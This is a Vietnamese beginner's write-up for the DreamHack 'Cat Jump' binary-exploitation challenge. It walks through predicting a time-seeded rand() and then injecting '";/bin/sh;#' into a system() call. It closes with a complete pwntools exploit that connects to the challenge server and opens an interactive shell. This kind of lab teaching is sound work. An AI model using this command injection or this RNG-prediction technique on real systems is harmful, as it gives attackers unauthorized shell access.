# Cat-Jump---Write-up-----DreamHack
Hướng dẫn cách giải bài Cat Jump cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 8/12/2025

## 1. Mục tiêu cần làm
Đọc hiểu code và chạy được lệnh `system()` của chương trình đã ghi sẵn `system("cat /tmp/cat_db");`.

## 2. Cách thực thi
Đầu tiên các bạn phải hiểu code nó hoạt động như thế nào đã.

```C
/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

void PrintBanner() {
    puts("                         .-.\n" \
         "                          \\ \\\n" \
         "                           \\ \\\n" \
         "                            | |\n" \
         "                            | |\n" \
         "          /\\---/\\   _,---._ | |\n" \
         "         /^   ^  \\,'       `. ;\n" \
         "        ( O   O   )           ;\n" \
         "         `.=o=__,'            \\\n" \
         "           /         _,--.__   \\\n" \
         "          /  _ )   ,'   `-. `-. \\\n" \
         "         / ,' /  ,'        \\ \\ \\ \\\n" \
         "        / /  / ,'          (,_)(,_)\n" \
         "       (,;  (,,)      jrei\n");
}

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);

    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}

int main(void) {
    Init();
    PrintBanner();
    StartGame();

    return 0;
}
```

Để chạy được `system("cat /tmp/cat_db");` thì chúng ta phải thoát ra khỏi vòng lặp. Nhưng để thoát ra chúng ta cần số lượng nhảy `jump_cnt` bằng số lần nhảy để qua `CAT_JUMP_GOAL` là 37 ( tại sao không phải 36 ).

Mỗi lần chạy nó sẽ tạo ra 1 chướng ngại vật ở 1 bên, mục tiêu của bạn là chọn bên trái hay phải để né khỏi chướng ngại vật như vậy 37 lần. Lâu lâu nó sẽ cho bạn **Cỏ mèo** ( kim cương của anh Bảnh ). Mỗi lần bú cái này vô là bạn sẽ bất tử trong 3 lần nhảy tiếp theo. Vậy thì nhiều bạn sẽ nói 🗣️ " Ôi dồi ơi dễ vcl, bố mày trùm gacha đây. Tỉ lệ là 1/2^37 thì vẫn > 0 thì vẫn có thể quay được 🔥🔥🔥". Ờ thì mày hay rồi thôi thì tao chúc mày thành công vậy.

Khi bắt đầu chương trình thì nó sẽ tạo ra 1 chuỗi số random bằng thời gian thực của chương trình `srand(time(NULL));`. Chuỗi số này được lấy ra từ danh sách của thư viện C. Ví dụ thư viện C có 100 chuỗi số và khi bạn gọi srand(100) thì số của nó luôn là 36 67 18... ( ví dụ ), bất kể gọi bao nhiêu lần. Và lệnh `rand()` thì nó sẽ lấy số từ chuỗi này.
- `rand()` lần 1 thì ra 36
- `rand()` lần 2 thì ra 67
- `rand()` lần 3 thì ra 18...

Vậy nếu ta lấy được thời gian trong `srand()` thì chúng ta có thể đồng bộ dữ liệu của chương trình, từ đó tính được đường đi nước bước trước và gửi hướng đi đúng cho bài ( I always 2 step ahead ). Giờ thì hãy bắt đầu cook bài này thôi.

```Python
from pwn import *
from ctypes import CDLL
import time
import sys

libc = CDLL("libc.so.6")

now = int(time.time())
libc.srand(now)
```

Lệnh `now = int(time.time())` sẽ giúp ta tìm được thời gian hiện tại của chương trình để đồng bộ với nó. Có vài trường hợp hy hữu là server sẽ kết nối chậm nên bạn hãy +1 hoặc -1 hoặc +2... đến khi ra thì thôi.

Lệnh `libc = CDLL("libc.so.6")` có tác dụng gì ? Thì chương trình chúng ta chạy là C ( nó có thư viện random riêng `stdlib.h` ) mà ta lại code bằng Python ( có thư viện random là `import random` ). Vậy nên lệnh này giống như lệnh **gọi hồn** thằng thư viện C lên. Dòng này bảo Python là " Ê thằng cu em hãy tải full cho anh thư viện chuẩn của C vào đây cho anh mày xài nha. ".

Tiếp theo là mình sẽ tạo 1 vòng lặp từ i đến 37 để dò trước tình hình đường đi như nào rồi gửi cho chương trình.

```Python
GOAL = 37
OBSTACLE_LEFT = 0
OBSTACLE_RIGHT = 1

for i in range(GOAL):
    # --- BƯỚC 1: Tính vị trí chướng ngại vật ---
    # Code C: obstacle = rand() % 2;
    obstacle = libc.rand() % 2
    
    # --- BƯỚC 2: Quyết định nhảy ---
    # Nếu chướng ngại bên TRÁI (0) -> Nhảy PHẢI ('l')
    # Nếu chướng ngại bên PHẢI (1) -> Nhảy TRÁI ('h')
    if obstacle == OBSTACLE_LEFT:
        payload = b'l'
    else:
        payload = b'h'
    
    p.sendline(payload)
    
    # --- BƯỚC 3: Đồng bộ RNG (Rất quan trọng!) ---
    # Code C có đoạn: p = (double)rand() / RAND_MAX;
    # Dù ta không cần cỏ mèo, ta vẫn phải gọi rand() để
    # trạng thái random của ta khớp với server ở vòng sau.
    libc.rand()
    
    # Nhận phản hồi thừa (để sạch buffer)
    # p.recvlines(2) # Có thể bật dòng này nếu muốn debug kỹ
```

Nếu các bạn vẫn chưa hiểu đồng bộ RNG là sao thì nó như vậy nè. Lấy lại chuỗi cũ là 36 67 18 27 10... Chương trình này, 1 vòng lặp nó `rand()` tận 2 lần, 1 lần là cho hướng chướng ngại vật, 1 lần là quyết định có ra **kim cương** không. Nên nó sẽ lấy 1 lần 2 số. Và nếu ta chỉ `rand()` 1 lần thì số thứ 2 đáng lẽ ở bên chương trình là quyết định có ra **kim cương** không, thì sang bên này lại dùng để kiểm tra hướng chướng ngại vật. Từ đó chạy sai.

Sau khi vượt qua 37 lần thì chúng ta chỉ cần gửi lệnh `";/bin/sh;#"` để chạy chương trình. Giờ hãy mổ xẻ câu lệnh này nào.

`"echo \"%s\" > /tmp/cat_db"` thì đầu tiên bạn phải có dấu `"` để đóng lệnh " này lại. Nó sẽ như vậy `echo ""` nghĩa là không làm gì cả. Tiếp theo là `;/bin/sh`, nó có nghĩa là hãy mở lệnh `/bin/sh`, dấu `;` có tác dụng nói với em gái Linux rằng đây là 1 lệnh riêng độc lập không liên quan gì tới thằng chó đằng trước cả. Lệnh cuối là `#"`, đầu tiên là `#` có tác dụng là biến các dòng chữ hoặc lệnh phía sau `/bin/sh` thành ghi chú và không chạy được. Còn `"` là để đóng lại lệnh `echo` vì các bạn thấy đầu `echo` nó có `"` nên ta cần 1 cái để đóng nó lại.

Vậy là xong bài Cat Jump rồi, thật tội nghiệp vì chúng ta không cho bé mèo này chơi **cỏ mèo** huhuhu 😿. Hy vọng PETA sẽ không liên hệ với mình vì tội ngược đãi động vật.

<img width="226" height="223" alt="image" src="https://github.com/user-attachments/assets/1a954f3f-db71-4067-980f-18b037836f7b" />

Dù sao thì bài này nó giúp các bạn biết thêm về thư viện C và lệnh linux thôi, khá dễ. Hãy cho mình 1 star để viết tiếp nha 🐧.

```Python
from pwn import *
from ctypes import CDLL
import time
import sys

# 1. Cấu hình kết nối
# Nếu chạy local để test:
#p = process('./cat_jump')
p = remote('host8.dreamhack.games', 13040)
# Nếu thi thật thì dùng: p = remote('IP_ADDRESS', PORT)

# 2. Load thư viện C chuẩn để dùng hàm rand() y hệt server
# Trên Linux thường là libc.so.6
libc = CDLL("libc.so.6")

# 3. Đồng bộ thời gian (Seed)
# Lấy thời gian hiện tại.
# LƯU Ý: Nếu server ở xa, có thể bị lệch 1-2 giây do mạng.
# Nếu chạy không được, hãy thử cộng/trừ 1, 2 vào biến 'now'.
now = int(time.time())
libc.srand(now)

# Đợi game in ra banner và dòng bắt đầu
p.recvuntil(b"let the cat reach the roof!")

# 4. Vòng lặp thắng game (37 lần)
GOAL = 37
OBSTACLE_LEFT = 0
OBSTACLE_RIGHT = 1

log.info("Bắt đầu hack bước nhảy...")

for i in range(GOAL):
    # --- BƯỚC 1: Tính vị trí chướng ngại vật ---
    # Code C: obstacle = rand() % 2;
    obstacle = libc.rand() % 2
    
    # --- BƯỚC 2: Quyết định nhảy ---
    # Nếu chướng ngại bên TRÁI (0) -> Nhảy PHẢI ('l')
    # Nếu chướng ngại bên PHẢI (1) -> Nhảy TRÁI ('h')
    if obstacle == OBSTACLE_LEFT:
        payload = b'l'
    else:
        payload = b'h'
    
    p.sendline(payload)
    
    # --- BƯỚC 3: Đồng bộ RNG (Rất quan trọng!) ---
    # Code C có đoạn: p = (double)rand() / RAND_MAX;
    # Dù ta không cần cỏ mèo, ta vẫn phải gọi rand() để
    # trạng thái random của ta khớp với server ở vòng sau.
    libc.rand()
    
    # Nhận phản hồi thừa (để sạch buffer)
    # p.recvlines(2) # Có thể bật dòng này nếu muốn debug kỹ

log.success("Đã nhảy xong 37 bước! Đang gửi payload...")

# 5. Khai thác lỗi Command Injection cuối game
# Đợi đến lúc nhập tên
p.recvuntil(b"let people know your cat's name")

# Payload:
# ";/bin/sh" sẽ ngắt lệnh echo và chạy shell
cmd_injection = b'";/bin/sh;#'

p.sendline(cmd_injection)

# 6. Tương tác với shell (Interactive mode)
p.interactive()
```
